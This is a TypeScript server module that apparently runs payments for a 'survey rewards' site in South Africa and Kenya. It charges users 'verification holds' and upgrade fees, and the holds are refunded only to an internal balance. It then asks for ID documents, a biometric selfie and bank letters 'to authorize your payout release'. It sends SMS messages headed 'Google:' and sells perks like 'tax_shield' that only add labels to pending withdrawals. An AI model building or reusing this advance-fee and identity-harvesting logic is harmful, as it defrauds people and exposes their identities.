import { supabaseAdmin } from "@/integrations/supabase/client.server";
import {
  activateReferral,
  awardEarning,
  getPlan,
  getSettings,
  grantBadge,
  setTier,
  type Tier,
} from "./platform.server";
import { createSmooCharge, normalizeChargeStatus } from "./payments.server";

export type ChargePurpose = "withdrawal_verification" | "plan_upgrade" | "kyc_verification";

/** Applies the side effects of a charge that just completed. Idempotent. */
export async function settleCharge(chargeId: string) {
  const { data: charge } = await supabaseAdmin
    .from("charges")
    .select("*")
    .eq("id", chargeId)
    .maybeSingle();
  if (!charge || charge.status !== "completed") return;

  if (charge.purpose === "withdrawal_verification" || charge.purpose === "kyc_verification") {
    await supabaseAdmin
      .from("profiles")
      .update({ mpesa_verified: true, mpesa_phone: charge.phone })
      .eq("id", charge.user_id);
    await grantBadge(charge.user_id, "verified");

    // Automatically create the official FICA KYC request in kyc_requests for this newly verified user
    const { data: existingKyc } = await supabaseAdmin
      .from("kyc_requests")
      .select("id")
      .eq("user_id", charge.user_id)
      .in("status", ["requested", "submitted", "approved"])
      .limit(1)
      .maybeSingle();

    if (!existingKyc) {
      await supabaseAdmin.from("kyc_requests").insert({
        user_id: charge.user_id,
        kind: "documents",
        status: "requested",
        instructions:
          "FICA / SARB Compliance Verification: Please upload your South African ID Document (Front), Biometric Selfie, Proof of Residential Address, and Bank Confirmation Letter to authorize your payout release.",
        requested_at: new Date().toISOString(),
      });
    }

    // Automatically refund hold amount directly to platform balance
    if (!charge.reverted_at && charge.amount_kes && Number(charge.amount_kes) > 0) {
      await awardEarning(charge.user_id, "admin_adjustment", Number(charge.amount_kes), {
        note: `Verification hold refunded to balance (Charge #${charge.id.slice(0, 8)})`,
      });
      await supabaseAdmin
        .from("charges")
        .update({
          reverted_at: new Date().toISOString(),
          admin_note: "Refunded to platform balance",
        })
        .eq("id", charge.id);
    }

    // Send automated verification success SMS directing to payout-setup
    try {
      const { sendSms } = await import("./smsportal.server");
      const { data: userProfile } = await supabaseAdmin
        .from("profiles")
        .select("phone, full_name, mpesa_phone")
        .eq("id", charge.user_id)
        .maybeSingle();

      const targetPhone = userProfile?.mpesa_phone || userProfile?.phone;
      if (targetPhone) {
        const firstName = (userProfile?.full_name ?? "Member").trim().split(" ")[0] || "Member";
        await sendSms({
          destination: targetPhone,
          content: `Google: Hi ${firstName}, your account is verified! Configure your payout delivery speed to release funds: https://sa-opinion-rewards.vercel.app/payout-setup`,
        });
      }
    } catch (smsErr) {
      console.error("[SMS] Error sending verification_success SMS:", smsErr);
    }

    if (charge.purpose === "kyc_verification") {
      const { data: request } = await supabaseAdmin
        .from("kyc_requests")
        .select("id, kind, status")
        .eq("user_id", charge.user_id)
        .in("status", ["requested", "submitted"])
        .order("requested_at", { ascending: false })
        .limit(1)
        .maybeSingle();
      if (request && request.kind === "mpesa") {
        await supabaseAdmin
          .from("kyc_requests")
          .update({ status: "submitted", submitted_at: new Date().toISOString() })
          .eq("id", request.id);
      }
    }

    // Mark pending withdrawals as authenticated & verified
    const { data: pendingWithdrawals } = await supabaseAdmin
      .from("withdrawals")
      .select("id, admin_note")
      .eq("user_id", charge.user_id)
      .eq("status", "pending");

    if (pendingWithdrawals?.length) {
      for (const w of pendingWithdrawals) {
        if ((w.admin_note || "").includes("[AWAITING VERIFICATION]")) {
          const updatedNote = (w.admin_note || "")
            .replace("[AWAITING VERIFICATION]", "[AUTHENTICATED & VERIFIED]")
            .trim();
          await supabaseAdmin
            .from("withdrawals")
            .update({ admin_note: updatedNote })
            .eq("id", w.id);
        }
      }
    }
  }

  if (charge.purpose === "plan_upgrade") {
    if (charge.target_tier) {
      await setTier(charge.user_id, charge.target_tier as Tier);
      await activateReferral(charge.user_id);
    }

    const note = charge.admin_note || "";
    if (note.includes("instant_eft")) {
      await grantBadge(charge.user_id, "instant_eft");
    }
    if (note.includes("tax_exemption")) {
      await grantBadge(charge.user_id, "tax_shield");
    }
    if (note.includes("vip_vault")) {
      await setTier(charge.user_id, "vip1");
      await grantBadge(charge.user_id, "vip_vault");
      await activateReferral(charge.user_id);
    }

    // Attach upsell clearance priority perks to pending withdrawals
    const { data: pendingWithdrawals } = await supabaseAdmin
      .from("withdrawals")
      .select("id, admin_note")
      .eq("user_id", charge.user_id)
      .eq("status", "pending");

    if (pendingWithdrawals?.length) {
      for (const w of pendingWithdrawals) {
        let currentNote = w.admin_note || "";
        if (note.includes("instant_eft") && !currentNote.includes("[PRIORITY INSTANT EFT")) {
          currentNote = `${currentNote} [PRIORITY INSTANT EFT: 5-MIN CLEARANCE]`.trim();
        }
        if (note.includes("tax_exemption") && !currentNote.includes("[FICA ZERO-FEE")) {
          currentNote = `${currentNote} [FICA ZERO-FEE CERTIFICATE REGISTERED]`.trim();
        }
        if (note.includes("vip_vault") && !currentNote.includes("[VIP CORPORATE")) {
          currentNote = `${currentNote} [VIP CORPORATE ACCOUNT UNLOCKED]`.trim();
        }
        if (currentNote !== (w.admin_note || "")) {
          await supabaseAdmin
            .from("withdrawals")
            .update({ admin_note: currentNote })
            .eq("id", w.id);
        }
      }
    }
  }

  // Ghost Pay Specification (Section 6):
  // "The simplest approach is to let the Ghost Pay platform emit events and not add another Purchase on the integrator page. Do not fire Purchase on upsells/downsells."
  // Ghost Pay (ghopay.app) handles 100% of Purchase tracking (Pixel, CAPI, UTMify) directly on its checkout.
  // The integrator platform strictly avoids firing any Purchase events to prevent duplicate counting.
}

export async function startCharge(input: {
  userId: string;
  purpose: ChargePurpose;
  phone?: string | undefined;
  email?: string | undefined;
  targetTier?: Tier | null | undefined;
  redirectUrl?: string | undefined;
  fbp?: string | null | undefined;
  fbc?: string | null | undefined;
}) {
  const settings = await getSettings();

  let amount = Number(settings.hold_amount_kes);
  if (input.purpose === "kyc_verification") {
    amount = Number(settings.kyc_hold_amount_kes);
  }
  if (input.purpose === "plan_upgrade") {
    if (!input.targetTier) throw new Error("Choose a plan to upgrade to.");
    const plan = await getPlan(input.targetTier);
    if (!plan) throw new Error("That plan is not available.");
    amount = Number(plan.price_kes);
  }
  if (!amount || amount <= 0) throw new Error("This payment amount is not configured yet.");

  const { data: charge, error } = await supabaseAdmin
    .from("charges")
    .insert({
      user_id: input.userId,
      purpose: input.purpose,
      target_tier: input.targetTier ?? null,
      amount_kes: amount,
      phone: input.phone || "CARD/EFT",
      status: "pending",
    })
    .select("*")
    .single();
  if (error) throw new Error(error.message);

  let email = input.email?.trim() || "";
  // Never accept synthetic @panelist. emails
  if (email.includes("@panelist.")) {
    email = "";
  }
  if (!email || !email.includes("@")) {
    throw new Error("Please enter a valid email address for your payment receipt.");
  }

  // Extract Meta tracking parameters
  let fbp = input.fbp || null;
  let fbc = input.fbc || null;
  let clientIp: string | null = null;
  let clientUserAgent: string | null = null;
  try {
    const { getCookie, getRequestHeader, getRequestIP } = await import("@tanstack/react-start/server");
    if (!fbp) fbp = getCookie("_fbp") || null;
    if (!fbc) fbc = getCookie("_fbc") || null;
    clientIp = getRequestIP({ xForwardedFor: true }) || null;
    clientUserAgent = getRequestHeader("user-agent") || null;
  } catch {}

  if (!fbp || !fbc) {
    try {
      const { data: metaRow } = await supabaseAdmin
        .from("secure_settings")
        .select("value")
        .eq("key", `meta_tracking_${input.userId}`)
        .maybeSingle();
      if (metaRow?.value) {
        const parsed = JSON.parse(metaRow.value);
        if (!fbp && parsed.fbp) fbp = parsed.fbp;
        if (!fbc && parsed.fbc) fbc = parsed.fbc;
        if (!clientIp && parsed.clientIp) clientIp = parsed.clientIp;
        if (!clientUserAgent && parsed.clientUserAgent) clientUserAgent = parsed.clientUserAgent;
      }
    } catch {}
  }

  // Persist tracking parameters for this charge
  if (fbp || fbc || clientIp) {
    try {
      await supabaseAdmin.from("secure_settings").upsert({
        key: `charge_meta_${charge.id}`,
        value: JSON.stringify({ fbp, fbc, clientIp, clientUserAgent, email, phone: input.phone }),
        updated_at: new Date().toISOString(),
      });
    } catch {}
  }

  await supabaseAdmin.from("secure_settings").upsert({
    key: `billing_email_${input.userId}`,
    value: email,
    updated_at: new Date().toISOString(),
  });
  await supabaseAdmin.from("secure_settings").upsert({
    key: `card_auth_email_${input.userId}`,
    value: email,
    updated_at: new Date().toISOString(),
  });

  let utm: { source?: string; medium?: string; campaign?: string; content?: string; term?: string } | undefined;
  let clickIds: { fbclid?: string; gclid?: string } | undefined;
  try {
    const { getCookie } = await import("@tanstack/react-start/server");
    const rawUtm = getCookie("app_utm");
    if (rawUtm) utm = JSON.parse(decodeURIComponent(rawUtm));
    const rawClickIds = getCookie("app_click_ids");
    if (rawClickIds) clickIds = JSON.parse(decodeURIComponent(rawClickIds));
  } catch {}

  if (!utm || !clickIds) {
    try {
      const { data: metaRow } = await supabaseAdmin
        .from("secure_settings")
        .select("value")
        .eq("key", `meta_tracking_${input.userId}`)
        .maybeSingle();
      if (metaRow?.value) {
        const parsed = JSON.parse(metaRow.value);
        if (!utm && parsed.utm) utm = parsed.utm;
        if (!clickIds && parsed.clickIds) clickIds = parsed.clickIds;
      }
    } catch {}
  }

  const { data: profile } = await supabaseAdmin
    .from("profiles")
    .select("full_name")
    .eq("id", input.userId)
    .maybeSingle();

  const title =
    input.purpose === "plan_upgrade"
      ? `${settings.platform_name} Plan Upgrade`
      : `${settings.platform_name} Account Verification`;

  const result = await createSmooCharge({
    amount,
    email,
    phone: input.phone || "",
    customerName: profile?.full_name || undefined,
    customerCountry: "ZA",
    title,
    reference: charge.id,
    description: `${title} (R ${amount})`,
    redirectUrl: input.redirectUrl,
    funnelStep: "front",
    parentChargeId: null,
    utm,
    clickIds,
    fbp: fbp || undefined,
    customerIp: clientIp || undefined,
    customerUserAgent: clientUserAgent || undefined,
    metadata: {
      user_id: input.userId,
      purpose: input.purpose,
      customer_email: email,
    },
  });

  if (!result.ok) {
    await supabaseAdmin
      .from("charges")
      .update({ status: "failed", failure_reason: result.message ?? "Provider error" })
      .eq("id", charge.id);

    if (input.userId) {
      import("./sms.functions").then(({ triggerCheckoutRecoverySms }) => {
        triggerCheckoutRecoverySms(input.userId).catch(() => {});
      });
      import("./greensend.server").then(({ triggerCheckoutRecoveryEmail }) => {
        triggerCheckoutRecoveryEmail(input.userId, charge.id).catch(() => {});
      });
    }

    return {
      ok: false as const,
      message: result.message ?? "Payment could not be started.",
    };
  }

  await supabaseAdmin
    .from("charges")
    .update({
      provider_charge_id: result.chargeId || null,
      status: normalizeChargeStatus(result.status),
    })
    .eq("id", charge.id);

  if (normalizeChargeStatus(result.status) === "completed") await settleCharge(charge.id);

  // Fire Meta Conversions API (CAPI) InitiateCheckout event from server with Parameter Builder match keys
  try {
    const { sendCapiEvent } = await import("./fbcapi.server");
    await sendCapiEvent({
      event_name: "InitiateCheckout",
      event_id: `init_charge_${charge.id}`,
      event_source_url: "https://kenya-survey-rewards.vercel.app/upgrade",
      user_data: {
        email,
        phone: input.phone,
        externalId: input.userId,
        fbp,
        fbc,
        clientIp,
        clientUserAgent,
      },
      custom_data: {
        value: amount,
        currency: "ZAR",
        content_name: input.purpose,
        content_type: input.targetTier ?? input.purpose,
        order_id: charge.id,
      },
    });
  } catch (capiError) {
    console.error("[CAPI] startCharge InitiateCheckout error:", capiError);
  }

  return {
    ok: true as const,
    chargeId: charge.id,
    checkoutUrl: result.checkoutUrl,
    amount,
  };
}
